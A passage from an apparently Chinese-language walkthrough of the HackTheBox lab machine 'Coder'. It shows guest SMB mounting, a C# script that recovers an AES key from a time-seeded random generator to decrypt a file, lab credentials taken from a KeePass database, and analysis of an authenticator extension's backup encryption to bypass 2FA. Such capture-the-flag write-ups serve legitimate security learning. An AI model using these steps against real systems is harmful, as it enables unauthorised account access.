class="line">修改时间：2022-11-12 06:17:08.374350100 +0800</span><br><span class="line">变更时间：2022-11-12 06:17:08.374350100 +0800</span><br><span class="line">创建时间：2022-11-08 05:05:02.949637700 +0800</span><br></pre></td></tr></table></figure><blockquote><p>还有另一种方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;sudo mount -t cifs \\\\dc01.coder.htb\\Development /mnt -o vers=3.0,username=guest,serverino,sec=ntlmsspi</span><br></pre></td></tr></table></figure><p><code>-t cifs</code>：指定文件系统为<code>cifs</code>，<code>cifs</code>是Windows系统常用的一种网络文件共享协议</p><p><code>\\\\dc01.coder.htb\\Development</code>：指定共享，双反斜杠是为了转义反斜杠</p><p><code>/mnt</code>：挂载点</p><p><code>-o</code>：指定其他的挂载选项</p><ul><li><code>vers=3.0</code>：设置<code>CIFS</code>的版本</li><li><code>username=guest</code>：指定用户名</li><li><code>serverino</code>：该选项请求服务器生成并返回唯一的 inode 号码，这在某些特定的应用或场景中可能会有所帮助。</li><li><code>sec=ntlmsspi</code>：该选项指定用于身份验证的安全机制。”ntlmsspi” 指的是 NTLMSSP（NT LAN Manager Security Support Provider），这是一种 Windows 认证协议。   </li></ul><p>之后利用<code>date</code>命令下的<code>-r</code>选项显示文件的最后修改时间</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250324000923.png" alt="微信截图_20250324000923"></p><p>完整命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">date</span> -r /mnt/Temporary\ Projects/s.blade.enc <span class="string">&quot;+%s&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250324001107.png" alt="微信截图_20250324001107"></p></blockquote><p>接下来利用AI写一个解密脚本即可</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 已知的 value 值</span></span><br><span class="line">        <span class="built_in">long</span> <span class="keyword">value</span> = <span class="number">1668205028</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用相同的随机数生成器生成 Key 和 IV</span></span><br><span class="line">        Random random = <span class="keyword">new</span> Random(Convert.ToInt32(<span class="keyword">value</span>));</span><br><span class="line">        <span class="built_in">byte</span>[] iv = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="built_in">byte</span>[] key = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line">        random.NextBytes(iv);</span><br><span class="line">        random.NextBytes(key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加密文件的路径</span></span><br><span class="line">        <span class="built_in">string</span> encryptedFile = <span class="string">&quot;C:\\Users\\lenovo\\Desktop\\s.blade.enc&quot;</span>;</span><br><span class="line">        <span class="comment">// 解密后文件的路径</span></span><br><span class="line">        <span class="built_in">string</span> decryptedFile = <span class="string">&quot;C:\\Users\\lenovo\\Desktop\\de&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解密文件</span></span><br><span class="line">        DecryptFile(encryptedFile, decryptedFile, key, iv);</span><br><span class="line"></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;文件解密完成！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DecryptFile</span>(<span class="params"><span class="built_in">string</span> encryptedFile, <span class="built_in">string</span> decryptedFile, <span class="built_in">byte</span>[] key, <span class="built_in">byte</span>[] iv</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (RijndaelManaged aes = <span class="keyword">new</span> RijndaelManaged())</span><br><span class="line">        &#123;</span><br><span class="line">            aes.Key = key;</span><br><span class="line">            aes.IV = iv;</span><br><span class="line">            aes.Mode = CipherMode.CBC;</span><br><span class="line">            aes.Padding = PaddingMode.PKCS7;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (FileStream fsInput = <span class="keyword">new</span> FileStream(encryptedFile, FileMode.Open))</span><br><span class="line">            <span class="keyword">using</span> (FileStream fsOutput = <span class="keyword">new</span> FileStream(decryptedFile, FileMode.Create))</span><br><span class="line">            <span class="keyword">using</span> (ICryptoTransform decryptor = aes.CreateDecryptor())</span><br><span class="line">            <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(fsInput, decryptor, CryptoStreamMode.Read))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] buffer = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="built_in">int</span> bytesRead;</span><br><span class="line">                <span class="keyword">while</span> ((bytesRead = cryptoStream.Read(buffer, <span class="number">0</span>, buffer.Length)) &gt; <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    fsOutput.Write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们将解密出来的文件放入010里面查看一下它是什么类型的文件</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250401211851.png" alt="微信截图_20250401211851"></p><p>由上图可知很明显的7z文件头，然后我们给他添加7z后缀进行解压，压缩包中的文件如下所示</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250401212023.png" alt="微信截图_20250401212023"></p><blockquote><p>KDBX 文件是KeePass密码管理器使用的数据库文件格式。它用于存储用户的密码、账户信息以及其他敏感数据，并通过强加密算法保护这些信息。</p></blockquote><p>我们可以利用<code>kpcli</code>和<code>keepassxc</code>解密我们的文件，建议使用<code>keepassxc</code>图形化很方便</p><p>打开后我们利用<code>.key</code>文件作为密钥</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250401213318.png" alt="微信截图_20250401213318"></p><p>数据库中存在两组登录凭据和一组验证器备份码<strong>Authenticator backup codes</strong>，在名为<strong>Teamcity</strong>的登录凭据中揭示了一个新的子域<a href="https://teamcity-dev.coder.htb">https://teamcity-dev.coder.htb</a></p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250401213430.png" alt="微信截图_20250401213430"></p><p>详细的信息如下所示</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Authenticator backup codes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;: &#123;</span><br><span class="line"><span class="code">    &quot;encrypted&quot;: true,</span></span><br><span class="line"><span class="code">    &quot;hash&quot;: &quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;,</span></span><br><span class="line"><span class="code">    &quot;index&quot;: 1,</span></span><br><span class="line"><span class="code">    &quot;type&quot;: &quot;totp&quot;,</span></span><br><span class="line"><span class="code">    &quot;secret&quot;: &quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;,</span></span><br><span class="line"><span class="code">    &quot;issuer&quot;: &quot;TeamCity&quot;,</span></span><br><span class="line"><span class="code">    &quot;account&quot;: &quot;s.blade&quot;</span></span><br><span class="line"><span class="code">  &#125;,</span></span><br><span class="line"><span class="code">  &quot;key&quot;: &#123;</span></span><br><span class="line"><span class="code">    &quot;enc&quot;: &quot;U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1&quot;,</span></span><br><span class="line"><span class="code">    &quot;hash&quot;: &quot;$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV&quot;</span></span><br><span class="line"><span class="code">  &#125;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"></span><br><span class="line"><span class="section">#看起来像一个域用户凭据</span></span><br><span class="line">O365 </span><br><span class="line">s.blade@coder.htb</span><br><span class="line">AmcwNO60Zg3vca3o0HDrTC6D</span><br><span class="line"></span><br><span class="line">Teamcity</span><br><span class="line">s.blade</span><br><span class="line">veh5nUSZFFoqz9CrrhSeuwhA</span><br><span class="line">https://teamcity-dev.coder.htb</span><br></pre></td></tr></table></figure><p>将子域加入hosts文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.11.207 teamcity-dev.coder.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure><p>s.blade账户没有winrm权限（可能不在Remote Management Users组中），但是有smb权限和ldap权限</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250425185906.png" alt="微信截图_20250425185906"></p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250425190222.png" alt="微信截图_20250425190222"></p><h2 id="对KDBX中的子域名进行信息收集"><a href="#对KDBX中的子域名进行信息收集" class="headerlink" title="对KDBX中的子域名进行信息收集"></a>对KDBX中的子域名进行信息收集</h2><p>服务开放在443端口上，界面是JetBrains的Teamcity登录界面，我们尝试利用凭据<code>s.blade:veh5nUSZFFoqz9CrrhSeuwhA</code>进行登录</p><blockquote><p>TeamCity是由JetBrains开发的 <strong>持续集成（CI）和持续部署（CD）</strong> 工具。它用于自动化软件构建、测试和发布流程，帮助开发团队提高效率和代码质量。</p></blockquote><h3 id="验证器备份码"><a href="#验证器备份码" class="headerlink" title="验证器备份码"></a>验证器备份码</h3><p>但是这里触发了Two-Factor Authentication即2FA</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250401215120.png" alt="微信截图_20250401215120"></p><blockquote><p>2FA即二要素认证是一种<strong>增强型身份验证机制</strong>，要求用户提供<strong>两种不同的认证因素</strong>以验证其身份，比单一密码认证更加安全，即使密码泄露，攻击者仍然需要第二个因素才能完成身份验证</p><p>二要素认证的 <strong>两个因素必须来自不同的类别</strong>，常见的组合有：</p><ul><li>密码 + 短信验证码</li><li>密码 + TOTP 动态验证码</li><li>密码 + 硬件安全密钥</li><li>密码 + 指纹识别</li></ul><p>我们在上面所发现的Authenticator backup codes采用的就是TOTP(Time-Based One-Time Password)是基于时间的动态验证码</p><p>还有一种身份验证机制叫做<strong>MFA（Multi-Factor Authentication）</strong></p></blockquote><p>我们<code>keepassxc</code>中的<code>Authenticator backup codes</code>很明显是被加密过的，在登录页面需要输入来自<code>authenticator app</code>获取到的6位数字码或恢复后的密码，这里在<a href="https://chromewebstore.google.com/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai?hl=en">谷歌</a>和火狐中均存在一个名叫<code>Authenticator</code>的2FA拓展 ，我们可以通过它获取6位数字密码或者恢复后的密码</p><p>我们可以先测试一下这个拓展程序，这里我们添加一个新的账户，这里的密码是16位字母</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402162158.png" alt="微信截图_20250402162158"></p><p>他会生成6位验证码</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402162316.png" alt="微信截图_20250402162316"></p><p>我们尝试下载一下备份文件并和我们在keepassxc中得到的进行对比</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402162359.png" alt="微信截图_20250402162359"></p><p>下面是备份文件的格式及内容，但是这是没有进行加密的文件，我们给备份文件设置密码看看会出现什么样子的变化</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otpauth://totp/test:?secret=aaaaaaaaaaaaaaaa&amp;issuer=test</span><br></pre></td></tr></table></figure><p>在设置的安全中添加密码</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402162753.png" alt="微信截图_20250402162753"></p><p>我们重新返回备份中可以看到多出了一个下载加密备份的选项，我们下载下来看一下</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402162838.png" alt="微信截图_20250402162838"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;c85c3817-c6e5-4dfe-a07e-5ef25ddf919f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EncOTPStorage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX18fvjz8FHUB0fN9sywDmlY/zfySf9ZCz8c6gC5n9BxWSKFpt4DLrHUepUT9yPMFNALZCnupgR1D/BGFxXHUvIRW8OMb6DPtupMkYZ6XSrP/oaiZVjKdt5lOGJSqv9VAB4FNxWfj7WN1YsOgcNqo6Q2eTXhRRB/aKaNSXTjEb3p7SfoXUryj/O/9Dff0AEUsSszgGoSSFbRgwUnccT1E3N0r6N94tqqAeAC4xKYZHrpUy/wK6RNy8GCyCfFSGdtrVKtrzgRuVIiFVCcGt6pKZQox9HKTReP+V6c=&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2083bee2-fe4d-494d-949e-364ed5349b64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;2083bee2-fe4d-494d-949e-364ed5349b64&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Key&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$argon2id$v=19$m=19456,t=2,p=1$MzEyNDNlNzNmZjMwOWQyYjNkNzcyZWEzNDQ5ZTY1MDg$X1YxjXK1RlMy3hnRqD4a6tKAF/6pnxAFvaQ85uYlBGk&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2083bee2-fe4d-494d-949e-364ed5349b64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;salt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;452012591ffc24bb2a23aee74e618e&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>可见返回的加密备份文件和我们之前获得的存在大量相似之处</p><p>我们可以选择导入备份文件并输入加密备份文件的密码获取当前的6位TOTP验证码值，那么现在的目标就是获取加密密码</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402163353.png" alt="微信截图_20250402163353"></p><h3 id="分析加解密逻辑"><a href="#分析加解密逻辑" class="headerlink" title="分析加解密逻辑"></a>分析加解密逻辑</h3><p>因为这个项目开源，我们在Github上找到<a href="https://github.com/Authenticator-Extension/Authenticator">源码</a>（这里选择dev分支）分析加密逻辑，首先定位<code>src/definitions/otp.d.ts</code>这个存在很多接口的地方，有如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title class_">EncryptionInterface</span> &#123;</span><br><span class="line">  <span class="title function_">getEncryptedString</span>(<span class="attr">data</span>: string): string;</span><br><span class="line">  <span class="title function_">decryptSecretString</span>(<span class="attr">entry</span>: string): string | <span class="literal">null</span>;</span><br><span class="line">  <span class="title function_">decryptEncSecret</span>(<span class="attr">entry</span>: <span class="title class_">OTPEntryInterface</span>): <span class="title class_">RawOTPStorage</span> | <span class="literal">null</span>;</span><br><span class="line">  <span class="title function_">getEncryptionStatus</span>(): boolean;</span><br><span class="line">  <span class="title function_">updateEncryptionPassword</span>(<span class="attr">password</span>: string): <span class="keyword">void</span>;</span><br><span class="line">  <span class="title function_">getEncryptionKeyId</span>(): string;</span><br><span class="line">  <span class="title function_">setEncryptionKeyId</span>(<span class="attr">id</span>: string): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们跟进<code>getEncryptedString</code>这个接口看一下具体实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getEncryptedString</span>(<span class="attr">data</span>: string): string &#123;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">password</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> data;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(data, <span class="variable language_">this</span>.<span class="property">password</span>).<span class="title function_">toString</span>();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>加密过程利用了<code>CryptoJS.AES</code>这个库，对提供的数据和密码进行加密</p><p>接下来看一下解密备份数据函数，函数存在于<code>src/import.ts</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">decryptBackupData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  backupData: &#123; [hash: string]: OTPStorage | Key &#125;,</span></span><br><span class="line"><span class="params">  passphrase: string | <span class="literal">null</span></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">decryptedBackupData</span>: &#123; [<span class="attr">hash</span>: string]: <span class="title class_">RawOTPStorage</span> &#125; = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">keys</span>: <span class="title class_">Map</span>&lt;string, string | <span class="literal">null</span>&gt; = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> hash <span class="keyword">in</span> backupData) &#123;</span><br><span class="line">    <span class="keyword">const</span> unknownStorageItem = backupData[hash];</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      <span class="keyword">typeof</span> unknownStorageItem !== <span class="string">&quot;object&quot;</span> ||</span><br><span class="line">      unknownStorageItem.<span class="property">dataType</span> === <span class="string">&quot;Key&quot;</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">storageItem</span>: <span class="title class_">RawOTPStorage</span>;</span><br><span class="line">    <span class="keyword">if</span> (unknownStorageItem.<span class="property">dataType</span> === <span class="string">&quot;EncOTPStorage&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!passphrase) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!keys.<span class="title function_">has</span>(unknownStorageItem.<span class="property">keyId</span>)) &#123;</span><br><span class="line">        keys.<span class="title function_">set</span>(</span><br><span class="line">          unknownStorageItem.<span class="property">keyId</span>,</span><br><span class="line">          <span class="keyword">await</span> <span class="title function_">findAndUnlockKey</span>(</span><br><span class="line">            backupData,</span><br><span class="line">            unknownStorageItem.<span class="property">keyId</span>,</span><br><span class="line">            passphrase</span><br><span class="line">          )</span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> decryptKey = keys.<span class="title function_">get</span>(unknownStorageItem.<span class="property">keyId</span>);</span><br><span class="line">      <span class="keyword">if</span> (!decryptKey) &#123;</span><br><span class="line">        <span class="comment">// wrong password for key</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      storageItem = &#123;</span><br><span class="line">        ...unknownStorageItem,</span><br><span class="line">        ...<span class="title class_">JSON</span>.<span class="title function_">parse</span>(</span><br><span class="line">          <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(unknownStorageItem.<span class="property">data</span>, decryptKey).<span class="title function_">toString</span>(</span><br><span class="line">            <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span></span><br><span class="line">          )</span><br><span class="line">        ),</span><br><span class="line">        <span class="attr">encrypted</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      storageItem = unknownStorageItem;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!storageItem.<span class="property">secret</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (storageItem.<span class="property">encrypted</span> &amp;&amp; !passphrase) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (storageItem.<span class="property">encrypted</span> &amp;&amp; passphrase) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        storageItem.<span class="property">secret</span> = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(</span><br><span class="line">          storageItem.<span class="property">secret</span>,</span><br><span class="line">          passphrase</span><br><span class="line">        ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);</span><br><span class="line">        storageItem.<span class="property">encrypted</span> = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// storageItem.secret may be empty after decrypt with wrong</span></span><br><span class="line">    <span class="comment">// passphrase</span></span><br><span class="line">    <span class="keyword">if</span> (!storageItem.<span class="property">secret</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    decryptedBackupData[hash] = storageItem;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> decryptedBackupData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这段代码是用来解密备份数据<code>backupData</code>的，传入的数据项由<code>hash</code>字段唯一标识，因为这是OTP密码，所以还要传入配套的<code>passphrase</code>密钥，<code>decryptBackupData</code> 函数通过提供的 <code>passphrase</code> 解密这些数据，并返回解密后的结果</p></blockquote><p>我们继续寻找调用<code>decryptBackupData</code>的地方，位于<a href="https://github.com/Authenticator-Extension/Authenticator/blob/9d9660bb73700b3e725800edc22836662d94afac/src/components/Import/TextImport.vue#L32">TextImport.vue</a>  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key &amp;&amp; passphrase) &#123;</span><br><span class="line">          decryptedbackupData = <span class="keyword">await</span> <span class="title function_">decryptBackupData</span>(</span><br><span class="line">            exportData,</span><br><span class="line">            <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(key.<span class="property">enc</span>, passphrase).<span class="title function_">toString</span>()</span><br><span class="line">          );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          decryptedbackupData = <span class="keyword">await</span> <span class="title function_">decryptBackupData</span>(exportData, passphrase);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到<code>key.enc</code>文件实际上也被加密了，也利用了一个<code>passphrase</code>，同时真正去解密我们的<code>Authenticator backup codes</code>的<code>passphrase</code>其实是解密后的<code>key.enc</code>文件，这里还存在一个比较绕的逻辑，利用解密后的<code>key.enc</code>第一次解密出的是totp对象的 <code>secret</code>，然后我们继续利用解密后的 <code>secret</code> 进一步解密剩余的totp数据，然后完成整个解密过程。</p><p>这里给出一个例子来理解这个解密过程</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td 